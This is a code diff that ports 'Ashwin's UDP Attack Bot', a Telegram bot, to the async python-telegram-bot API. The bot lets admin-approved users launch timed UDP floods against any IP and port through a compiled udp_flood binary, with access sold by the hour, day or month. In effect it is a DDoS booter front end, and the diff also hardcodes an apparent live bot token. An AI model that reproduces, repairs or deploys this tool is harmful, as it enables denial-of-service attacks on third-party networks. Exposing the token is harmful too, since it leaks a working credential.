@@ -3,11 +3,11 @@ import time
 import sqlite3
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, CallbackContext, MessageHandler, Filters, CallbackQueryHandler
+from telegram.ext import Application, CommandHandler, CallbackContext, MessageHandler, filters, CallbackQueryHandler
 
 # CONFIGURATION
-BOT_TOKEN = "<7971488271:AAE5o0zQj2NBpwcWBQjIKSCiWT63jbRy4f8>"
-ADMIN_ID = <6773132033>  # Replace with your Telegram ID
+BOT_TOKEN = "7971488271:AAE5o0zQj2NBpwcWBQjIKSCiWT63jbRy4f8"
+ADMIN_ID = 6773132033  # Replace with your Telegram ID
 BINARY_PATH = "./udp_flood"  # Path to the compiled C binary
 DB_PATH = "users.db"
 
@@ -61,10 +61,10 @@ def list_approved_users():
     return approved_users
 
 # Start Command
-def start(update: Update, context: CallbackContext):
+async def start(update: Update, context: CallbackContext):
     buttons = [[InlineKeyboardButton("Request Approval ✅", callback_data="request_approval")]]
     reply_markup = InlineKeyboardMarkup(buttons)
-    update.message.reply_text(
+    await update.message.reply_text(
         "Welcome to Ashwin's UDP Attack Bot! ⚡\n\n" +
         "This bot allows approved users to perform tests.\n\n" +
         "Made by Ashwin",
@@ -72,13 +72,13 @@ def start(update: Update, context: CallbackContext):
     )
 
 # Approve Command (Admin Only)
-def approve(update: Update, context: CallbackContext):
+async def approve(update: Update, context: CallbackContext):
     if update.effective_user.id != ADMIN_ID:
-        update.message.reply_text("❌ You are not authorized to use this command.")
+        await update.message.reply_text("❌ You are not authorized to use this command.")
         return
 
     if len(context.args) < 3:
-        update.message.reply_text("Usage: /approve <user_id> <username> <duration: hour/day/month>")
+        await update.message.reply_text("Usage: /approve <user_id> <username> <duration: hour/day/month>")
         return
 
     try:
@@ -92,23 +92,23 @@ def approve(update: Update, context: CallbackContext):
         elif duration_str == "month":
             duration = timedelta(days=30)
         else:
-            update.message.reply_text("Invalid duration. Use hour, day, or month.")
+            await update.message.reply_text("Invalid duration. Use hour, day, or month.")
             return
 
         approve_user(user_id, username, duration)
-        update.message.reply_text(f"✅ User {username} (ID: {user_id}) approved for {duration_str}.")
+        await update.message.reply_text(f"✅ User {username} (ID: {user_id}) approved for {duration_str}.")
     except ValueError:
-        update.message.reply_text("Invalid user ID.")
+        await update.message.reply_text("Invalid user ID.")
 
 # List Users Command (Admin Only)
-def list_users(update: Update, context: CallbackContext):
+async def list_users(update: Update, context: CallbackContext):
     if update.effective_user.id != ADMIN_ID:
-        update.message.reply_text("❌ You are not authorized to use this command.")
+        await update.message.reply_text("❌ You are not authorized to use this command.")
         return
 
     users = list_approved_users()
     if not users:
-        update.message.reply_text("No users are currently approved.")
+        await update.message.reply_text("No users are currently approved.")
         return
 
     response = "Approved Users:\n"
@@ -116,26 +116,26 @@ def list_users(update: Update, context: CallbackContext):
         hours, remainder = divmod(time_left.total_seconds(), 3600)
         minutes, seconds = divmod(remainder, 60)
         response += f"\n✅ {username} (ID: {user_id}) - {int(hours)}h {int(minutes)}m {int(seconds)}s left"
-    update.message.reply_text(response)
+    await update.message.reply_text(response)
 
 # Attack Command
 last_attack_time = {}
 
-def attack(update: Update, context: CallbackContext):
+async def attack(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
 
     if not is_user_approved(user_id):
-        update.message.reply_text("❌ You are not approved to use this bot. Contact the admin.")
+        await update.message.reply_text("❌ You are not approved to use this bot. Contact the admin.")
         return
 
     global last_attack_time
     now = time.time()
     if user_id in last_attack_time and now - last_attack_time[user_id] < 60:
-        update.message.reply_text("⏳ Cooldown in effect. Please wait before launching another attack.")
+        await update.message.reply_text("⏳ Cooldown in effect. Please wait before launching another attack.")
         return
 
     if len(context.args) < 3:
-        update.message.reply_text("Usage: /attack <ip> <port> <duration>")
+        await update.message.reply_text("Usage: /attack <ip> <port> <duration>")
         return
 
     try:
@@ -143,40 +143,42 @@ def attack(update: Update, context: CallbackContext):
         port = int(context.args[1])
         duration = int(context.args[2])
         if duration > 60:
-            update.message.reply_text("⏳ Maximum attack duration is 60 seconds.")
+            await update.message.reply_text("⏳ Maximum attack duration is 60 seconds.")
             return
 
         # Execute the binary
         subprocess.Popen([BINARY_PATH, ip, str(port), str(duration), "1"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         last_attack_time[user_id] = now
-        update.message.reply_text(f"⚡ Attack launched on {ip}:{port} for {duration} seconds.")
+        await update.message.reply_text(f"⚡ Attack launched on {ip}:{port} for {duration} seconds.")
     except ValueError:
-        update.message.reply_text("Invalid port or duration.")
+        await update.message.reply_text("Invalid port or duration.")
 
 # Callback for Inline Buttons
-def button_handler(update: Update, context: CallbackContext):
+async def button_handler(update: Update, context: CallbackContext):
     query = update.callback_query
-    query.answer()
+    await query.answer()
 
-    if query.data == "request_approval":
-        query.edit_message_text("📩 Contact the admin to get approved. Provide your user ID.")
+    new_text = "📩 Contact the admin to get approved. Provide your user ID."
+    
+    # Check if the message text is already the same before editing
+    if query.message.text != new_text:
+        await query.edit_message_text(new_text)
 
 # Main Function
 def main():
     init_db()
-    updater = Updater(BOT_TOKEN)
+    application = Application.builder().token(BOT_TOKEN).build()
 
-    dispatcher = updater.dispatcher
-    dispatcher.add_handler(CommandHandler("start", start))
-    dispatcher.add_handler(CommandHandler("approve", approve))
-    dispatcher.add_handler(CommandHandler("list_users", list_users))
-    dispatcher.add_handler(CommandHandler("attack", attack))
-    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, start))
-    dispatcher.add_handler(MessageHandler(Filters.command, start))
-    dispatcher.add_handler(CallbackQueryHandler(button_handler))
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("approve", approve))
+    application.add_handler(CommandHandler("list_users", list_users))
+    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start))
+    application.add_handler(MessageHandler(filters.COMMAND, start))
+    application.add_handler(CallbackQueryHandler(button_handler))
 
-    updater.start_polling()
-    updater.idle()
+    application.run_polling()
 
+# Run the main function
 if __name__ == "__main__":
     main()
